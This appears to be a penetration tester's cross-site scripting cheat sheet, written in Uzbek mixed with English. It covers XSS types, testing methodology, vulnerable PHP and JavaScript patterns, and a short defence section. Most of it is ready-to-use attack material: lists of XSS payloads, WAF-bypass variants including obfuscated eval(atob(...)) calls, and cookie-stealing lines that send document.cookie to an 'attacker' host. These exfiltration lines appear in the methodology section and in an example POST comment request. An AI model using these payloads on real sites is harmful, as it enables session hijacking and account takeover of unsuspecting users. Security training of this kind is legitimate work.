# Cross-Site Scripting (XSS)

## 1. Ta'rif
XSS — attacker kiritgan skript boshqa foydalanuvchi brauzerida run bo'lishi. Impact: session hijack (cookie), account takeover, keylogging, phishing, CSRF, DoS.

## 2. Qayerdan kelib chiqadi
- Input not escape qilmasdan HTML'a yozilsa (`innerHTML`, `document.write`, `echo`/`print`)
- Reflected: search qidiruv, error, `?q=` qaytariladi
- Stored: comment, name, profile field, blog post, message
- DOM-based: `location.hash`, `document.URL`, `window.name`, `postMessage`
- `src`/`href`/`style`/`on*` attribute x-injection

## 3. Turlari
| Tur | Qayerda run qiladi |
|-----|-------------------|
| Reflected | request'da, bir marta |
| Stored | DB'da, har boshqa foydalanuvchida |
| DOM-based | server'siz, faqat JS |
| Blind | admin panel / log viewer'da |

## 4. Metodologiya
1. Barcha input'lar: URL param, POST, headers, cookies, file nomi, upload name.
2. Sinov: `<>"'/=;&{}`, `"><svg/onload=alert(1)>`, `<script>alert(1)</script>`.
3. Qayerda render qilinayotganini tekshiring (response'dan qidirib toping) — kontekst!!!
   - HTML body → `<script>` yoki event attribute
   - Attribute (`<input value="USER">`) → `" autofocus onfocus=alert(1) x="`
   - Attribute unenalib, value= (`href`, `src`) → `javascript:alert(1)`
   - CSS → `</style><script>`
   - JS string → `';alert(1)//`
   - JSON → unicode/escape before pipe
4. Filter bo'lsa: case mix, `alert(1)%0a`, `\u0061lert`, backtick, `onerror=alert` `<img src=x onerror=alert(1)>`, eventlar (`onload,onerror,onmouseover,onfocus,oninput`), `<svg/onload>`, `<details open ontoggle>`, `<a href="javascript:">`.
5. Stored: comment/profile/name orqali admin cookie olish (blind XSS).
6. Exfiltratsiya:
   ```html
   <script>fetch('//attacker/c?c='+document.cookie)</script>
   <img src=x onerror="fetch('//attacker/c?'+document.cookie)">
   <img src=x onerror=new Image().src='//attacker/c?'+document.cookie>
   ```

## 5. Payload'lar
```
<script>alert(1)</script>
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<a href="javascript:alert(1)">click</a>
"><img src=x onerror=alert(1)>
'><script>alert(1)</script>
</script><script>alert(1)</script>
' autofocus onfocus=alert(1) x='
<input onfocus=alert(1) autofocus>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
<input type="image" src=x onerror=alert(1)>
<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">

# WAF bypass
<scr<script>ipt>alert(1)</scr</script>ipt>
<script>\u0061lert(1)</script>
<img src=x onerror=alert(1)//>
<javascript:alert(1)>
<svg/onload=top[`aler`+`t`](1)>
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
<a href="%6a%61%76%61%73%63%72%69%70%74:alert(1)">
```

## 6. Request misollari
```
GET /search?q=<script>alert(document.domain)</script> HTTP/1.1
Host: target.com

POST /comment HTTP/1.1
Host: target.com
Cookie: session=...

name=<img src=x onerror="fetch('//attacker/c?'+document.cookie)">&comment=test

# DOM (location.hash, JS ishlataveradi)
GET /#<img src=x onerror=alert(1)> HTTP/1.1
```

## 7. Zaif code misollari
```php
// ZAIF
echo "Salom, " . $_GET['name'];                     // reflected
echo "<div>" . $comment . "</div>";                 // stored
echo "<a href='" . $url . "'>link</a>";             // javascript: mumkin

// JS — ZAIF (DOM)
document.getElementById("x").innerHTML = location.hash.slice(1);
eval("var a = " + param + ";");
element.setAttribute("src", userInput);             // javascript: mumkin

// JS — XAVFSIZ
textContent = value;  // innerHTML o'rniga
// Serverda: htmlspecialchars($input, ENT_QUOTES) PHP, escape in EJS/Handlebars
```

## 8. Nimalarga ahamiyat berish (checklist)
- [ ] Kontekst aniqlash — qaysi escape kerak: `<>` vs `"` vs `'` vs backtick
- [ ] Textarea/script/style ichiga kirdimi — kontekstni buzish
- [ ] `src`/`href` — `javascript:` protocolga
- [ ] Stored nimadir serverda jo'natilsa har page'da run qiladi (pestilent XSS)
- [ ] Blind XSS — admin panel (User-Agent, contact form, feedback) — payl. `ngrok`/Burp Collaborator
- [ ] Cookie httpOnly bo'lmasa → session steal
- [ ] JS bilan isnat false — `secure`, httponly, SPA routing, sanitizer client kontent
- [ ] CSP bor bo'lsa → `csp/note.md` ga qarang

## 9. Himoya
- Context-aware escaping hamma jo'yida (autoescape templating)
- CSP strict (`default-src 'none'`), `HttpOnly` cookies
- DOMPurify san'atida, never `innerHTML` (user input)
- Input validation + output encoding